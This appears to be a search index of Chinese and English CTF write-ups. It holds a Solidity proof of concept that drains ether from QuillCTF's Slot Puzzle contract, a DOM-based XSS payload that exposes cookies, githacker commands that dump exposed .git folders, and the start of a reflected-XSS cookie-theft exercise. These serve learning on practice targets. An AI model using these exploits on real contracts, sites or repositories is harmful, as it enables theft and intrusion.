\"hacker\" ); } function calc ( uint256 [ 8 ] memory keys , uint256 slot ) internal pure returns ( uint256 ) { for ( uint8 i = 0 ; i < 8 ; i ++ ) { slot = uint256 ( keccak256 ( abi . encodePacked ( keys [ i ], slot ))); if ( i % 2 == 1 ) slot += 1 ; // move to variable map } return slot - 1 ; // back to variable hash } function testHack () public { vm . startPrank ( hacker , hacker ); assertEq ( address ( slotPuzzleFactory ). balance , 3 ether , \"weth contract should have 3 ether\" ); // solution Recipients [] memory recipients = new Recipients []( 3 ); recipients [ 0 ] = Recipients ({ account : hacker , amount : 1 ether }); recipients [ 1 ] = recipients [ 0 ]; recipients [ 2 ] = recipients [ 0 ]; bytes32 slot = keccak256 ( abi . encodePacked ( calc ( [ uint256 ( uint160 ( hacker )), block . number , block . timestamp , uint256 ( uint160 ( address ( slotPuzzleFactory ))), block . prevrandao , uint256 ( uint160 ( address ( block . coinbase ))), block . chainid , uint256 ( uint160 ( uint256 ( blockhash ( block . number - block . basefee )))) ], 1 )) ); slotPuzzleFactory . deploy ( Parameters ({ totalRecipients : 3 , offset : 0x1a4 , // offset to the value 0x144 recipients : recipients , slotKey : abi . encode ( 0x144 , slot ) // 0x144 = slot.offset(0x1c4) - 0x80 }) ); assertEq ( address ( slotPuzzleFactory ). balance , 0 , \"weth contract should have 0 ether\" ); assertEq ( address ( hacker ). balance , 3 ether , \"hacker should have 3 ether\" ); vm . stopPrank (); } }","title":"Slot Puzzle"},{"location":"wargames/quillctf/slot_puzzle/#objective-of-ctf","text":"Your purpose is just to call the deploy() function to recover the 3 ether. QuillCTF Challenges - Slot Puzzle","title":"Objective of CTF"},{"location":"wargames/quillctf/slot_puzzle/#vulnerability-description","text":"Only the instance of SlotPuzzle deployed from SlotPuzzleFactory can call the payout() function to transfer ether and we need to pass the check in ascertainSlot() to let SlotPuzzle call payout() Calculate the slot iteratively according to keccak256(key, slot + (is ghostStore ? 1 : 0)) pattern We need three recipients, all pointing to hacker, to recover 3 ether since each payout() can only transfer 1 ether The difficult part is to decide offset > < params.slotKey is copy from calldata to memory. bytes memory slotKey stores the slotKey offset in memory, here is 0x80 The offset of slot is calculated using add(slotKey, calldataload(offset)) . So, the value of offset should be the offset of target value (i.e. slot.offset - slotKey) in the calldata. We can make use of Parameters.slotKey to pass that value Offset(Hex) Calldata Layout 04 offset of struct Parameters 24 totalRecipients, 3 44 offset 64 offset of the Recipients array (relative to struct offset) 84 offset of slotKey (relative to struct offset) a4 size of the Recipients array c4 recipients[0].account ... ... 184 size of slotKey 1a4 slot.offset - 0x80 1c4 slot","title":"Vulnerability Description"},{"location":"wargames/quillctf/slot_puzzle/#proof-of-concept","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.17 ; import \"forge-std/Test.sol\" ; import { SlotPuzzle } from \"src/SlotPuzzle.sol\" ; import { SlotPuzzleFactory } from \"src/SlotPuzzleFactory.sol\" ; import { Parameters , Recipients } from \"src/interface/ISlotPuzzleFactory.sol\" ; contract SlotPuzzleTest is Test { SlotPuzzle public slotPuzzle ; SlotPuzzleFactory public slotPuzzleFactory ; address hacker ; function setUp () public { slotPuzzleFactory = new SlotPuzzleFactory { value : 3 ether }(); hacker = makeAddr ( \"hacker\" ); } function calc ( uint256 [ 8 ] memory keys , uint256 slot ) internal pure returns ( uint256 ) { for ( uint8 i = 0 ; i < 8 ; i ++ ) { slot = uint256 ( keccak256 ( abi . encodePacked ( keys [ i ], slot ))); if ( i % 2 == 1 ) slot += 1 ; // move to variable map } return slot - 1 ; // back to variable hash } function testHack () public { vm . startPrank ( hacker , hacker ); assertEq ( address ( slotPuzzleFactory ). balance , 3 ether , \"weth contract should have 3 ether\" ); // solution Recipients [] memory recipients = new Recipients []( 3 ); recipients [ 0 ] = Recipients ({ account : hacker , amount : 1 ether }); recipients [ 1 ] = recipients [ 0 ]; recipients [ 2 ] = recipients [ 0 ]; bytes32 slot = keccak256 ( abi . encodePacked ( calc ( [ uint256 ( uint160 ( hacker )), block . number , block . timestamp , uint256 ( uint160 ( address ( slotPuzzleFactory ))), block . prevrandao , uint256 ( uint160 ( address ( block . coinbase ))), block . chainid , uint256 ( uint160 ( uint256 ( blockhash ( block . number - block . basefee )))) ], 1 )) ); slotPuzzleFactory . deploy ( Parameters ({ totalRecipients : 3 , offset : 0x1a4 , // offset to the value 0x144 recipients : recipients , slotKey : abi . encode ( 0x144 , slot ) // 0x144 = slot.offset(0x1c4) - 0x80 }) ); assertEq ( address ( slotPuzzleFactory ). balance , 0 , \"weth contract should have 0 ether\" ); assertEq ( address ( hacker ). balance , 3 ether , \"hacker should have 3 ether\" ); vm . stopPrank (); } }","title":"Proof of Concept"},{"location":"web/calculus_calc_exercise/","tags":["DOM-based XSS"],"text":"#DOM-based XSS .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 \u5c0f X \u4f5c\u4e3a\u67d0\u95e8\u7b26\u53f7\u8ba1\u7b97\u8bfe\u7a0b\u7684\u52a9\u6559\uff0c\u4e3a\u4e86\u8ba9\u5927\u5bb6\u719f\u6089\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u4ed6\u5199\u4e86\u4e00\u4e2a\u5c0f\u7f51\u7ad9\uff1a\u4e0a\u9762\u653e\u7740\u4e94\u9053\u7b80\u5355\u7684\u9898\u76ee\uff0c\u53ea\u8981\u8f93\u5165\u59d3\u540d\u548c\u9898\u76ee\u7b54\u6848\uff0c\u63d0\u4ea4\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u81ea\u5df1\u7684\u5206\u6570\u3002 \u70b9\u51fb\u6b64\u94fe\u63a5\u8bbf\u95ee\u7ec3\u4e60\u7f51\u7ad9 \u60f3\u8d77\u81ea\u5df1\u524d\u51e0\u5929\u5728\u516c\u4f17\u53f7\u4e0a\u5b66\u8fc7\u7684 Java \u8bbe\u8ba1\u6a21\u5f0f\u514d\u8d39\u8bd5\u542c\u8bfe\uff0c\u672c\u7740\u524d\u540e\u7aef\u79bb\u5fc3\uff08\u54a6\uff1f\u662f\u524d\u540e\u7aef\u79bb\u5fc3\u5417\uff1f\u8fd8\u662f\u79bb\u5a5a\uff1f\u79bb\u3002\u3002\u79bb\u8c31\uff1f\u603b\u4e4b\u628a\u529f\u80fd\u80fd\u62c6\u5219\u62c6\u5c31\u5bf9\u5566\uff09\u7684\u601d\u60f3\uff0c\u5c0f X \u8fd8\u5355\u72ec\u5199\u4e86\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6b22\u8fce\u540c\u5b66\u4eec\u628a\u81ea\u5df1\u7684\u6210\u7ee9\u94fe\u63a5\u63d0\u4ea4\u4e0a\u6765\u3002 \u603b\u4e4b\uff0c\u56e0\u4e3a\u5176\u5148\u8fdb\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u9700\u8981\u540c\u5b66\u4eec\u505a\u5b8c\u7ec3\u4e60\u4e4b\u540e\u624b\u52a8\u628a\u6210\u7ee9\u8fde\u63a5\u8d34\u5230\u8fd9\u91cc\u6765\uff1a \u70b9\u51fb\u6b64\u94fe\u63a5\u63d0\u4ea4\u7ec3\u4e60\u6210\u7ee9 URL \u63a5\u6536\u6210\u7ee9\u94fe\u63a5\u7684\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\uff1a bot.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 # Copyright 2022 USTC-Hackergame # Copyright 2021 PKU-GeekGame from selenium import webdriver import selenium import sys import time import urllib.parse import os # secret.py will NOT be revealed to players from secret import FLAG , BOT_SECRET LOGIN_URL = f 'http://web/?bot= { BOT_SECRET } ' print ( 'Please submit your quiz URL:' ) url = input ( '> ' ) # URL replacement # In our environment bot access http://web # If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code # and write your own logic to use your own token to \"login\" with headless browser parsed = urllib . parse . urlparse ( url ) parsed = parsed . _replace ( netloc = \"web\" , scheme = \"http\" ) url = urllib . parse . urlunparse ( parsed ) print ( f \"Your URL converted to { url } \" ) try : options = webdriver . ChromeOptions () options . add_argument ( '--no-sandbox' ) # sandbox not working in docker options . add_argument ( '--headless' ) options . add_argument ( '--disable-gpu' ) options . add_argument ( '--user-data-dir=/dev/shm/user-data' ) os . environ [ 'TMPDIR' ] = \"/dev/shm/\" options . add_experimental_option ( 'excludeSwitches' , [ 'enable-logging' ]) with webdriver . Chrome ( options = options ) as driver : ua = driver . execute_script ( 'return navigator.userAgent' ) print ( ' I am using' , ua ) print ( '- Logining...' ) driver . get ( LOGIN_URL ) time . sleep ( 4 ) print ( ' Putting secret flag...' ) driver . execute_script ( f 'document.cookie=\"flag= { FLAG } \"' ) time . sleep ( 1 ) print ( '- Now browsing your quiz result...' ) driver . get ( url ) time . sleep ( 4 ) try : greeting = driver . execute_script ( f \"return document.querySelector('#greeting').textContent\" ) score = driver . execute_script ( f \"return document.querySelector('#score').textContent\" ) except selenium . common . exceptions . JavascriptException : print ( 'JavaScript Error: Did you give me correct URL?' ) exit ( 1 ) print ( \"OK. Now I know that:\" ) print ( greeting ) print ( score ) print ( '- Thank you for joining my quiz!' ) except Exception as e : print ( 'ERROR' , type ( e )) import traceback traceback . print_exception ( * sys . exc_info (), limit = 0 , file = None , chain = False ) \u89e3\u9898\u601d\u8def \u00b6 \u7ec3\u4e60\u7f51\u7ad9\u53ef\u4ee5\u8f93\u5165\u59d3\u540d\u548c\u5404\u9898\u7684\u7b54\u6848 \u63d0\u4ea4\u540e\u8df3\u8f6c\u5230\u6210\u7ee9\u9875\u9762\uff0c\u8f93\u5165\u59d3\u540d\u4e2d\u7684 HTML \u6807\u7b7e\u5e76\u6ca1\u6709\u88ab\u8fc7\u6ee4 \u7b2c\u4e00\u53cd\u5e94\u662f\u53cd\u5c04\u578b XSS\uff0c\u672c\u5730\u8bd5\u4e86\u4e5f\u80fd\u83b7\u53d6\u5230\u8bf7\u6c42\uff0c\u4f46\u4e00\u76f4\u83b7\u53d6\u4e0d\u5230 bot \u7684\u8bf7\u6c42\uff0c\u624d\u53c8\u91cd\u65b0\u770b\u4e86 bot.py \uff0c\u53d1\u73b0 bot \u8bf7\u6c42\u7684\u662f http://web \uff0c\u65e0\u6cd5\u8bbf\u95ee\u5916\u90e8\u7f51\u7edc\uff0c\u7ed3\u5408\u8f93\u5165\u59d3\u540d\u56de\u663e\uff0c\u5b9e\u9645\u4e0a\u5e94\u8be5\u662f DOM \u578b XSS \u76f4\u63a5\u4f7f\u7528 <script> \u65e0\u6cd5\u6267\u884c\u811a\u672c\uff0c\u901a\u8fc7\u4ee5\u4e0b payload \u83b7\u53d6 Flag 1 <p id='cookie'></p><img src=x onerror=\"javascript: document.getElementById('cookie').innerHTML = document.cookie;\"> Flag \u00b6 flag{xS5_1OI_is_N0t_SOHARD}","title":"\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60"},{"location":"web/calculus_calc_exercise/#_1","text":"\u5c0f X \u4f5c\u4e3a\u67d0\u95e8\u7b26\u53f7\u8ba1\u7b97\u8bfe\u7a0b\u7684\u52a9\u6559\uff0c\u4e3a\u4e86\u8ba9\u5927\u5bb6\u719f\u6089\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u4ed6\u5199\u4e86\u4e00\u4e2a\u5c0f\u7f51\u7ad9\uff1a\u4e0a\u9762\u653e\u7740\u4e94\u9053\u7b80\u5355\u7684\u9898\u76ee\uff0c\u53ea\u8981\u8f93\u5165\u59d3\u540d\u548c\u9898\u76ee\u7b54\u6848\uff0c\u63d0\u4ea4\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u81ea\u5df1\u7684\u5206\u6570\u3002 \u70b9\u51fb\u6b64\u94fe\u63a5\u8bbf\u95ee\u7ec3\u4e60\u7f51\u7ad9 \u60f3\u8d77\u81ea\u5df1\u524d\u51e0\u5929\u5728\u516c\u4f17\u53f7\u4e0a\u5b66\u8fc7\u7684 Java \u8bbe\u8ba1\u6a21\u5f0f\u514d\u8d39\u8bd5\u542c\u8bfe\uff0c\u672c\u7740\u524d\u540e\u7aef\u79bb\u5fc3\uff08\u54a6\uff1f\u662f\u524d\u540e\u7aef\u79bb\u5fc3\u5417\uff1f\u8fd8\u662f\u79bb\u5a5a\uff1f\u79bb\u3002\u3002\u79bb\u8c31\uff1f\u603b\u4e4b\u628a\u529f\u80fd\u80fd\u62c6\u5219\u62c6\u5c31\u5bf9\u5566\uff09\u7684\u601d\u60f3\uff0c\u5c0f X \u8fd8\u5355\u72ec\u5199\u4e86\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6b22\u8fce\u540c\u5b66\u4eec\u628a\u81ea\u5df1\u7684\u6210\u7ee9\u94fe\u63a5\u63d0\u4ea4\u4e0a\u6765\u3002 \u603b\u4e4b\uff0c\u56e0\u4e3a\u5176\u5148\u8fdb\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u9700\u8981\u540c\u5b66\u4eec\u505a\u5b8c\u7ec3\u4e60\u4e4b\u540e\u624b\u52a8\u628a\u6210\u7ee9\u8fde\u63a5\u8d34\u5230\u8fd9\u91cc\u6765\uff1a \u70b9\u51fb\u6b64\u94fe\u63a5\u63d0\u4ea4\u7ec3\u4e60\u6210\u7ee9 URL \u63a5\u6536\u6210\u7ee9\u94fe\u63a5\u7684\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\uff1a bot.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 # Copyright 2022 USTC-Hackergame # Copyright 2021 PKU-GeekGame from selenium import webdriver import selenium import sys import time import urllib.parse import os # secret.py will NOT be revealed to players from secret import FLAG , BOT_SECRET LOGIN_URL = f 'http://web/?bot= { BOT_SECRET } ' print ( 'Please submit your quiz URL:' ) url = input ( '> ' ) # URL replacement # In our environment bot access http://web # If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code # and write your own logic to use your own token to \"login\" with headless browser parsed = urllib . parse . urlparse ( url ) parsed = parsed . _replace ( netloc = \"web\" , scheme = \"http\" ) url = urllib . parse . urlunparse ( parsed ) print ( f \"Your URL converted to { url } \" ) try : options = webdriver . ChromeOptions () options . add_argument ( '--no-sandbox' ) # sandbox not working in docker options . add_argument ( '--headless' ) options . add_argument ( '--disable-gpu' ) options . add_argument ( '--user-data-dir=/dev/shm/user-data' ) os . environ [ 'TMPDIR' ] = \"/dev/shm/\" options . add_experimental_option ( 'excludeSwitches' , [ 'enable-logging' ]) with webdriver . Chrome ( options = options ) as driver : ua = driver . execute_script ( 'return navigator.userAgent' ) print ( ' I am using' , ua ) print ( '- Logining...' ) driver . get ( LOGIN_URL ) time . sleep ( 4 ) print ( ' Putting secret flag...' ) driver . execute_script ( f 'document.cookie=\"flag= { FLAG } \"' ) time . sleep ( 1 ) print ( '- Now browsing your quiz result...' ) driver . get ( url ) time . sleep ( 4 ) try : greeting = driver . execute_script ( f \"return document.querySelector('#greeting').textContent\" ) score = driver . execute_script ( f \"return document.querySelector('#score').textContent\" ) except selenium . common . exceptions . JavascriptException : print ( 'JavaScript Error: Did you give me correct URL?' ) exit ( 1 ) print ( \"OK. Now I know that:\" ) print ( greeting ) print ( score ) print ( '- Thank you for joining my quiz!' ) except Exception as e : print ( 'ERROR' , type ( e )) import traceback traceback . print_exception ( * sys . exc_info (), limit = 0 , file = None , chain = False )","title":"\u9898\u76ee"},{"location":"web/calculus_calc_exercise/#_2","text":"\u7ec3\u4e60\u7f51\u7ad9\u53ef\u4ee5\u8f93\u5165\u59d3\u540d\u548c\u5404\u9898\u7684\u7b54\u6848 \u63d0\u4ea4\u540e\u8df3\u8f6c\u5230\u6210\u7ee9\u9875\u9762\uff0c\u8f93\u5165\u59d3\u540d\u4e2d\u7684 HTML \u6807\u7b7e\u5e76\u6ca1\u6709\u88ab\u8fc7\u6ee4 \u7b2c\u4e00\u53cd\u5e94\u662f\u53cd\u5c04\u578b XSS\uff0c\u672c\u5730\u8bd5\u4e86\u4e5f\u80fd\u83b7\u53d6\u5230\u8bf7\u6c42\uff0c\u4f46\u4e00\u76f4\u83b7\u53d6\u4e0d\u5230 bot \u7684\u8bf7\u6c42\uff0c\u624d\u53c8\u91cd\u65b0\u770b\u4e86 bot.py \uff0c\u53d1\u73b0 bot \u8bf7\u6c42\u7684\u662f http://web \uff0c\u65e0\u6cd5\u8bbf\u95ee\u5916\u90e8\u7f51\u7edc\uff0c\u7ed3\u5408\u8f93\u5165\u59d3\u540d\u56de\u663e\uff0c\u5b9e\u9645\u4e0a\u5e94\u8be5\u662f DOM \u578b XSS \u76f4\u63a5\u4f7f\u7528 <script> \u65e0\u6cd5\u6267\u884c\u811a\u672c\uff0c\u901a\u8fc7\u4ee5\u4e0b payload \u83b7\u53d6 Flag 1 <p id='cookie'></p><img src=x onerror=\"javascript: document.getElementById('cookie').innerHTML = document.cookie;\">","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/calculus_calc_exercise/#flag","text":"flag{xS5_1OI_is_N0t_SOHARD}","title":"Flag"},{"location":"web/ctfhub_git_leakage/","text":"\u9898\u76ee \u00b6 \u5f53\u524d\u5927\u91cf\u5f00\u53d1\u4eba\u5458\u4f7f\u7528 git \u8fdb\u884c\u7248\u672c\u63a7\u5236\uff0c\u5bf9\u7ad9\u70b9\u81ea\u52a8\u90e8\u7f72\u3002\u5982\u679c\u914d\u7f6e\u4e0d\u5f53,\u53ef\u80fd\u4f1a\u5c06 .git \u6587\u4ef6\u5939\u76f4\u63a5\u90e8\u7f72\u5230\u7ebf\u4e0a\u73af\u5883\u3002\u8fd9\u5c31\u5f15\u8d77\u4e86 git \u6cc4\u9732\u6f0f\u6d1e\u3002 Log \u00b6 \u4f7f\u7528\u5de5\u5177 WangYihang/GitHacker \u68c0\u51fa Git \u4ed3\u5e93 1 $ githacker --url http://challenge-6c68a91f29757be4.sandbox.ctfhub.com:10080/.git/ --folder result \u8fdb\u5165\u68c0\u51fa\u76ee\u5f55\uff0c\u67e5\u770b\u65e5\u5fd7\u4fe1\u606f\uff0c\u5f53\u524d\u4f4d\u4e8e flag \u5df2\u7ecf\u5220\u9664\u7684\u7248\u672c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ git log commit 331d0cdbf0d55ada0ee114851b846705bf19fd99 ( HEAD -> master ) Author: CTFHub <sandbox@ctfhub.com> Date: Thu May 27 06 :27:19 2021 +0000 remove flag commit 3db6be0b17e9d3141cfee4d7593d0d1a56bc1e82 Author: CTFHub <sandbox@ctfhub.com> Date: Thu May 27 06 :27:19 2021 +0000 add flag commit 3891bbce49688c80cd02d6bc91953055d249c697 Author: CTFHub <sandbox@ctfhub.com> Date: Thu May 27 06 :27:19 2021 +0000 init \u4e0e add flag \u7248\u672c\u8fdb\u884c\u6bd4\u8f83\uff0c\u5dee\u5f02\u4fe1\u606f\u5373\u4e3a Flag 1 2 3 4 5 6 7 8 $ git diff 3db6be0b17e9d3141cfee4d7593d0d1a56bc1e82 diff --git a/1380320821329.txt b/1380320821329.txt deleted file mode 100644 index 7bbea29..0000000 --- a/1380320821329.txt +++ /dev/null @@ -1 +0,0 @@ -ctfhub { 9b8fffa8e969d3950e8e98ba } Stash \u00b6 \u540c\u6837\u5730\uff0c\u68c0\u51fa\u4ed3\u5e93\u5e76\u8fdb\u5165\u4ed3\u5e93\u76ee\u5f55 1 2 $ githacker --url http://challenge-942122132ef0c89f.sandbox.ctfhub.com:10080/.git --folder result $ cd result/ git stash \u4fdd\u5b58\u672c\u5730\u672a\u63d0\u4ea4\u7684\u4fee\u6539\uff0c\u5e76\u5c06\u5de5\u4f5c\u76ee\u5f55\u6062\u590d\u5230\u5f53\u524d HEAD commit \u7684\u7248\u672c\uff0c\u4fbf\u4e8e\u5728\u5f53\u524d\u5206\u652f\u4fee\u6539\u672a\u63d0\u4ea4\u7684\u60c5\u51b5\u4e0b\u5207\u6362\u5206\u652f \u4f7f\u7528 git stash apply \u6062\u590d\uff0c\u5373\u53ef\u83b7\u5f97 Flag \u6587\u4ef6 1 2 3 4 5 6 7 8 $ ls 50x.html index.html $ git stash apply \u51b2\u7a81\uff08\u4fee\u6539/\u5220\u9664\uff09\uff1a291731707232651.txt \u5728 Updated upstream \u4e2d\u88ab\u5220\u9664\uff0c\u5728 Stashed changes \u4e2d\u88ab \u4fee\u6539\u3002291731707232651.txt \u7684 Stashed changes \u7248\u672c\u88ab\u4fdd\u7559\u3002 $ ls 291731707232651 .txt 50x.html index.html $ cat 291731707232651 .txt ctfhub { bb407b064154f284de35ad5c } Index \u00b6 GitHacker \u68c0\u51fa\u76ee\u5f55\u540e\u5c31\u770b\u5230 Flag \u6587\u4ef6\u4e86\uff08\u54a6 :0\uff09 1 2 3 4 5 6 $ githacker --url http://challenge-4c0f5006f79ca499.sandbox.ctfhub.com:10080/.git --folder result $ cd result/ $ ls 2084027691726 .txt 50x.html index.html $ cat 2084027691726 .txt ctfhub { c4bdf1723804493c9d8d61b3 } Git index \u4f5c\u4e3a\u5de5\u4f5c\u76ee\u5f55\u548c\u4ed3\u5e93\u4e4b\u95f4\u7684\u6682\u5b58\u533a\u57df\uff0c\u53ef\u5b58\u50a8\u4e00\u7ec4\u4fee\u6539\u4e00\u5e76\u63d0\u4ea4","title":"CTFHub - Git \u6cc4\u9732"},{"location":"web/ctfhub_git_leakage/#_1","text":"\u5f53\u524d\u5927\u91cf\u5f00\u53d1\u4eba\u5458\u4f7f\u7528 git \u8fdb\u884c\u7248\u672c\u63a7\u5236\uff0c\u5bf9\u7ad9\u70b9\u81ea\u52a8\u90e8\u7f72\u3002\u5982\u679c\u914d\u7f6e\u4e0d\u5f53,\u53ef\u80fd\u4f1a\u5c06 .git \u6587\u4ef6\u5939\u76f4\u63a5\u90e8\u7f72\u5230\u7ebf\u4e0a\u73af\u5883\u3002\u8fd9\u5c31\u5f15\u8d77\u4e86 git \u6cc4\u9732\u6f0f\u6d1e\u3002","title":"\u9898\u76ee"},{"location":"web/ctfhub_git_leakage/#log","text":"\u4f7f\u7528\u5de5\u5177 WangYihang/GitHacker \u68c0\u51fa Git \u4ed3\u5e93 1 $ githacker --url http://challenge-6c68a91f29757be4.sandbox.ctfhub.com:10080/.git/ --folder result \u8fdb\u5165\u68c0\u51fa\u76ee\u5f55\uff0c\u67e5\u770b\u65e5\u5fd7\u4fe1\u606f\uff0c\u5f53\u524d\u4f4d\u4e8e flag \u5df2\u7ecf\u5220\u9664\u7684\u7248\u672c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ git log commit 331d0cdbf0d55ada0ee114851b846705bf19fd99 ( HEAD -> master ) Author: CTFHub <sandbox@ctfhub.com> Date: Thu May 27 06 :27:19 2021 +0000 remove flag commit 3db6be0b17e9d3141cfee4d7593d0d1a56bc1e82 Author: CTFHub <sandbox@ctfhub.com> Date: Thu May 27 06 :27:19 2021 +0000 add flag commit 3891bbce49688c80cd02d6bc91953055d249c697 Author: CTFHub <sandbox@ctfhub.com> Date: Thu May 27 06 :27:19 2021 +0000 init \u4e0e add flag \u7248\u672c\u8fdb\u884c\u6bd4\u8f83\uff0c\u5dee\u5f02\u4fe1\u606f\u5373\u4e3a Flag 1 2 3 4 5 6 7 8 $ git diff 3db6be0b17e9d3141cfee4d7593d0d1a56bc1e82 diff --git a/1380320821329.txt b/1380320821329.txt deleted file mode 100644 index 7bbea29..0000000 --- a/1380320821329.txt +++ /dev/null @@ -1 +0,0 @@ -ctfhub { 9b8fffa8e969d3950e8e98ba }","title":"Log"},{"location":"web/ctfhub_git_leakage/#stash","text":"\u540c\u6837\u5730\uff0c\u68c0\u51fa\u4ed3\u5e93\u5e76\u8fdb\u5165\u4ed3\u5e93\u76ee\u5f55 1 2 $ githacker --url http://challenge-942122132ef0c89f.sandbox.ctfhub.com:10080/.git --folder result $ cd result/ git stash \u4fdd\u5b58\u672c\u5730\u672a\u63d0\u4ea4\u7684\u4fee\u6539\uff0c\u5e76\u5c06\u5de5\u4f5c\u76ee\u5f55\u6062\u590d\u5230\u5f53\u524d HEAD commit \u7684\u7248\u672c\uff0c\u4fbf\u4e8e\u5728\u5f53\u524d\u5206\u652f\u4fee\u6539\u672a\u63d0\u4ea4\u7684\u60c5\u51b5\u4e0b\u5207\u6362\u5206\u652f \u4f7f\u7528 git stash apply \u6062\u590d\uff0c\u5373\u53ef\u83b7\u5f97 Flag \u6587\u4ef6 1 2 3 4 5 6 7 8 $ ls 50x.html index.html $ git stash apply \u51b2\u7a81\uff08\u4fee\u6539/\u5220\u9664\uff09\uff1a291731707232651.txt \u5728 Updated upstream \u4e2d\u88ab\u5220\u9664\uff0c\u5728 Stashed changes \u4e2d\u88ab \u4fee\u6539\u3002291731707232651.txt \u7684 Stashed changes \u7248\u672c\u88ab\u4fdd\u7559\u3002 $ ls 291731707232651 .txt 50x.html index.html $ cat 291731707232651 .txt ctfhub { bb407b064154f284de35ad5c }","title":"Stash"},{"location":"web/ctfhub_git_leakage/#index","text":"GitHacker \u68c0\u51fa\u76ee\u5f55\u540e\u5c31\u770b\u5230 Flag \u6587\u4ef6\u4e86\uff08\u54a6 :0\uff09 1 2 3 4 5 6 $ githacker --url http://challenge-4c0f5006f79ca499.sandbox.ctfhub.com:10080/.git --folder result $ cd result/ $ ls 2084027691726 .txt 50x.html index.html $ cat 2084027691726 .txt ctfhub { c4bdf1723804493c9d8d61b3 } Git index \u4f5c\u4e3a\u5de5\u4f5c\u76ee\u5f55\u548c\u4ed3\u5e93\u4e4b\u95f4\u7684\u6682\u5b58\u533a\u57df\uff0c\u53ef\u5b58\u50a8\u4e00\u7ec4\u4fee\u6539\u4e00\u5e76\u63d0\u4ea4","title":"Index"},{"location":"web/ctfhub_reflected_xss/","text":"\u53cd\u5c04\u578b XSS \u00b6 \u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002 \u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002 \u672c\u9898\u9700\u8981\u638c\u63e1\u7684\u662f\u5bf9\u5ba2\u6237\u7aef Cookies \u7684\u7a83\u53d6\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u5728 XSS \u5e73\u53f0 \u6ce8\u518c\u5e76\u767b\u5f55 \u521b\u5efa\u9879\u76ee \u914d\u7f6e\u4ee3\u7801\u4e2d\u9009\u62e9\u9ed8\u8ba4\u6a21\u5757\u5c31\u53ef\u4ee5\u4e86(<\u309d\u03c9\u03a6) \u518d\u6765\u770b\u770b\u9898\u76ee\u5bf9\u5e94\u7684\u7f51\u7ad9\uff0c\u5728 What's your name \u5904\u586b\u5165\u5185\u5bb9\u5e76\u63d0\u4ea4\uff0c\u63d0\u4ea4\u5185\u5bb9\u4f1a\u663e\u793a\u5728\u9875\u9762\u4e0a \u4f7f\u7528 <h3> \u6807\u7b7e\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8bc1\u660e\u663e\u793a\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u8fc7\u6ee4 Send URL to Bot \u5e94\u8be5\u662f\u5145\u5f53\u5176\u4ed6\u7528\u6237\u6765\u5bf9\u63d0\u4f9b\u7684\u94fe\u63a5\u8fdb\u884c\u8bbf\u95ee \u5c06\u4ee5\u4e0b\u5185\u5bb9\u7c98\u8d34\u81f3 What's your name \u5e76\u63d0\u4ea4\u8868\u5355 